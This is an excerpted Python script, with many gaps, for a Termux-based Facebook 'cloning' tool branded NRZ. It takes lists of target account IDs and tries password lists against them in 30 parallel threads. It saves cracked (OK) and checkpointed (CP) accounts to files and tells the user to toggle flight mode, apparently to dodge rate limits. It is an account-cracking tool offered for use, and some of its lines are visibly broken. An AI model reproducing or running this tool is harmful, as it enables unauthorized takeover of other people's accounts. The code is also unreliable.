...
def modules():
	...
	time.sleeping(3)
	print("\033[1;37m [\u001b[36mNRZ\033[1;37m] CHECKING FOR UPDATES \033[1;37m")
	os.system('pkg update -y && pkg upgrade -y')
	os.system('clear')
	try:
		import rich
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36mNRZ\033[1;37m] RICH IS BEING INSTALLED \033[1;37m")
	...
	try:
		...
		print("\033[1;37m [\u001b[36mNRZ\033[1;37m] BS4 IS BEING INSTALLED \033[1;37m")
	...
	try:
		...
		print("\033[1;37m [\u001b[36mNRZ\033[1;37m] REQUESTS IS BEING INSTALLED \033[1;37m")
...
AUTHOR     : Niraj Thalal                                                            
GITHUB     : niraj928356                                                             
FACEBOOK   : Selling War                                                          
VERSION    :  '\x1b[1;91m' 6.2
...
def psw():
	os.system('clear')
	banner()
	os.system('espeak -a 300 " ENTER,   Your,    PASSWORD,   Sir,"')
	print(" [\u001b[36m>\033[1;37m] >> ENTER YOUR PASSWORD  " )
	linex()
	upsw = input(" [\u001b[36mNRZ\033[1;37m] ENTER PASSWORD : " )
	open('.password.txt','w').write(upsw)
	print('\033[1;37m----------------------------------------------')
	animation(' >> YOUR PASSWORD HAS BEEN CHANGED ')
	os.system('espeak -a 300 " PASSWORD,   HAS,  BEEN,  CHANGED,"')
	linex()
try:
...
def askpsw():
	...
	askpw = input(" [\u001b[36mNRZ\033[1;37m] ENTER YOUR PASSWORD : " )
	if askpw == upass:
		linex()
		...
		linex()
		animation(" [\u001b[36mNRZ\033[1;37m] ACCESS DENIED " )
		time.sleep(1)
		back()

def cpsw():
	linex()
	oldpsw = input(" [\u001b[36mNRZ\033[1;37m] ENTER OLD PASSWORD : " )
	if oldpsw == upass:
		linex()
		upsw = input(" [\u001b[36mNRZ\033[1;37m] ENTER NEW PASSWORD : " )
		open('.password.txt','w').write(upsw)
		print('\033[1;37m----------------------------------------------')
		animation(' >> YOUR PASSWORD HAS BEEN CHANGED ')
		time.sleep(1)
		...
		linex()
		animation(" [\u001b[36mNRZ\033[1;37m] WRONG PASSWORD " )
		time.sleep(1)
		back()
...
def name(): 
	os.system('clear')
	banner()
	print(" [\u001b[36m>\033[1;37m] USE FREE FROM AZAD (HW, KINGY)" )
	linex()
	uan = input(" [\u001b[36mNRZ\033[1;37m] ENTER YOUR NAME : " )
...
def login():
        ...
        try:
                ...
                print(' \x1b[1;91m Cookies login has been successfull...')
                time.sleep(1)
                menu()
        except KeyError:
...
def menu():
	try:
		...
		print('[\x1b[1;91m NRZ]  \x1b[1;91m SUCESSFULL COKIES DONE...!!! ')
		time.sleep(5)
	os.system('clear')
	banner()
	print(" [\u001b[36mNRZ\033[1;37m] WELCOME     : "+uname)
	print(" [\u001b[36mNRZ\033[1;37m] TODAYS DATE : "+date)
	print(" NRZ IS NOT A NAME.IT IS BRAND ")
	linex()
	...
	if _____cowok__pink_____ in ['1']:
		...
		linex()
		animation(' [NRZ] DONE LOGOUT ')
		exit()
	else:
		linex()
		animation(' [NRZ] SELECT CORRECTLY ')
		back()
...
def result():
	...
	linex()
	kz = input(' [\u001b[36mNRZ\033[1;37m] CHOOSE : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			linex()
			animation(' [\u001b[36mNRZ\033[1;37m] FILE NOT FOUND ')
			time.sleep(3)
			back()
		if len(vin)==0:
			linex()
			animation(' [\u001b[36mNRZ\033[1;37m] NO CP RESULTS FOUND ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			linex()
			geeh = input(' [\u001b[36mNRZ\033[1;37m] CHOOSE : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				animation(' [\u001b[36mNRZ\033[1;37m] NO OPTION FOUND ')
				exit()
			...
			for cpku in range(len(lin)):
				...
				print(f' [\u001b[36mNRZ\033[1;37m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
		...
		if len(vin)==0:
			linex()
			animation(' [\u001b[36mNRZ\033[1;37m] NO OK RESULTS FOUND ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\u001b[36mNRZ\033[1;37m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> PRESS ENTER TO BACK ')
			back()
		...
		linex()
		animation(' [\u001b[36mNRZ\033[1;37m] NO OPTION FOUND IN MENU')
		exit()
...
def dump_massal():
	...
	try:
		linex()
		jum = int(input(' [\u001b[36mNRZ\033[1;37m] ENTER TARGET UID & ACCOUNTS : '))
		linex()
	except ValueError:
		linex()
		animation(' [NRZ] INVALID OPTION ')
		exit()
	if jum<1 or jum>100000000:
		linex()
		animation(' [NRZ] TRY AGAIN ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [\u001b[36mNRZ\033[1;37m] INPUT UID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		linex()
		print(f' [\u001b[36mNRZ\033[1;37m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
...
def crack_file():
	linex()
	o = input(' [\u001b[36mNRZ\033[1;37m] INPUT FILE NAME : ')
	try:lin = open(o).read().splitlines()
	except:
		linex()
		animation(' [NRZ] FILE NOT FOUND')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
...
def setting():
	...
	linex()
	hu = input(' [\u001b[36mNRZ\033[1;37m] CHOOSE : ')
	if hu in ['1','01']:
		...
		for bacot in id:
			...
			id2.insert(xx,bacot)
	linex()
	print(" [\u001b[36mNRZ\033[1;37m] LOGIN METHOD ")
	linex()
	print(" [\u001b[36m1\033[1;37m] METHOD 1 (BEST)")
	print(" [\u001b[36m2\033[1;37m] METHOD 2 ")
	linex()
	hc = input(' [\u001b[36mNRZ\033[1;37m] CHOOSE : ')
	if hc in ['1','01']:
...
def passwrd():
	os.system('clear')
	banner()
	print(f' [\u001b[36mNRZ\033[1;37m] TOTAL IDz : \u001b[36m',str(len(id)))
	print(" \033[1;37m[\u001b[36mNRZ\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
	linex()
	print(f' \u001b[36m>> \033[1;37mUSE FLIGHT MODE AFTER 5 MINUTES ')
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('\n\033[1;37m----------------------------------------------')
	print(' [\u001b[36mNRZ\033[1;37m] CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
	print(' [\u001b[36mNRZ\033[1;37m] OK : %s '%(ok))('/sdcard/Ok.txt')
	print(' [\u001b[36mNRZ\033[1;37m] CP : %s '%(cp))('/sdcard/Cp.txt')
	linex()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[NRZ]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} â”‚ {pw} {P}')
				...
				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} â”‚ {pw} {P}')
